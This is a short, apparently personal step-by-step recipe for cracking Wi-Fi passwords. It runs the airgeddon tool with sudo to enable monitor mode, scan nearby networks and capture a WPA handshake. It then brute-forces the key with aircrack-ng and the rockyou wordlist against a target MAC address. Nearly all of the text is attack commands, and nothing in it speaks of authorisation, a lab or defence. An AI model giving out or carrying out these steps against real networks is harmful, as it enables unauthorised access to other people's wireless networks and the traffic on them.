firts step --
  git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
  cd airgeddon
  sudo bash airgeddon.sh

second step -
  start airgeddon
  sudo airgeddon

third step -
  select 2 for enable monitor mode

fourth step -
  select 4 for Explore wireless network

fifth step -
  select 7 for capture handshake

six step -
  aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [Target MAC] [handshake.cap]
